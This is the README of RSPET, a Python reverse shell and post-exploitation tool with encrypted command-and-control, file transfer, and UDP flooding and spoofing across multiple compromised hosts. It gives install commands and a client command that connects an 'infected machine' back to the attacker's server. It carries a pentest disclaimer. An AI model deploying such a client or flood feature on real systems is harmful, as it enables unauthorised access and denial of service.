> RSPET (Reverse Shell and Post Exploitation Tool) is a Python based reverse shell equipped with functionalities that assist in a post exploitation scenario.

DISCLAIMER: This software is provided for educational and PenTesting purposes and as a proof of concept. The developer(s) do not endorse, incite or in any other way support unauthorized computer access and networks disruption.

Current Version: `v1.0.0`

## Features

* Remote Command Execution[1]
* TLS Encryption of the Server-Client communication
* Built-in File/Binary transfer (both ways) over the Encrypted traffic
* Built-in UDP Flooding tool
* Built-in UDP Spoofing tool[2]
* Multiple/All Hosts management; order File/Binary transfer and UDP Flood from Multiple/All connected Hosts
* Modular Code Design to allow easy customization
* Client update mechanism
* Client script is tested and is compatible with PyInstaller (can be made into .exe)[3]
* Full server side Plug-in support[4]
* Plug-in management, including the ability to Install(Download) and Dynamically Load Plug-ins.
* RESTful API for the Server Module

*[1]The skeleton for the client came from [primalsecurity.net](http://www.primalsecurity.net) so if you like this pack of scripts you'll probably love what they do

*[2]UDP Spoofing uses RAW_SOCKETS so in order to utilize it, the client has to run on an OS that supports RAW_SOCKETS (most Unix-Based) and with root privileges. Finally, most of the ISPs have implementations in place that will either drop or re-structure spoofed packets

*[3]Again check [primalsecurity.net's](http://www.primalsecurity.net) perfect blogpost about producing an .exe

*[4]Detailed documentation on creating Plug-ins available in [Online Documentation](http://rspet.readthedocs.io/en/latest/dev/)!

## Deployment:

* `rspet_server.py` is situated at the attacker's machine and running to accept connections
* `rspet_client.py` is situated in the infected machine(s) and will initiate the connection and wait for input.

## Installation

In order to install RSPET's Server Module:
```sh
pip install --user rspet-server
```
This will take care of all the core dependencies. In order install REST API's dependencies:
```sh
pip install --user rspet-server[rest]
```
Finally to setup the needed directories files and permissions:
```sh
sudo env "PATH=$PATH" rspet-server-setup
```

## Execution:

* Server:
    ```sh
    rspet_server [-c #clients, --ip ipToBind, -p portToBind]
    ```
max_connections defaults to 5 if left blank

* RESTful API:
    ```sh
    rspet-server-rest [-c #clients, --ip ipToBind, -p portToBind]
    ```

* Client:
    ```sh
    python rspet_client.py <server_ip> [server_port]
    ```

Many changes can be made to fit individual needs.

As always if you have any suggestion, bug report or complain feel free to contact me.

## Todo

- [x] Add TLS encryption in order to:
  - [x] Replace XORing (and subsequently obfuscation with encryption)
  - [ ] Verify the "authenticity" of clients
    - [ ] A mechanism to issue and verify client certificates
    - [ ] A mechanism to recognize compromised client certs
- [x] Add a Plug-in system to client (a more compact one)
 - [x] Add remote installation of Plug-ins to client
 - [ ] Add installed Plug-ins report from client to server
 - [ ] Add check server side that a client plugin is present at the client before execution
- [ ] Add UDP Reflection functionality
- [ ] Provide more settings via config file
- [ ] Re-introduce multythreading when handling multiple hosts.
- [ ] Add support for command overridding in server plugins

## Styleguide

This project is following [Google's Python Styleguide](https://google.github.io/styleguide/pyguide.html).

## Contribution Opportunities

This project is open for contributors. If you have implemented a new feature, or maybe an improvement to the current code feel free to open a pull request. If you want to suggest a new feature open an issue. Additionally Testers are needed to run a few standard scenarios (and a few of their own maybe) to decrease the chance a bug slips into a new version. Should there be any interest about testing a `beta` branch will be created (where code to be tested will be uploaded) along with a list of scenarios. For a full guide on contribution opportunities and guides check out [the "Contributing" chapter on RSPET's Online Documentation](http://rspet.readthedocs.io/en/latest/contribute/)
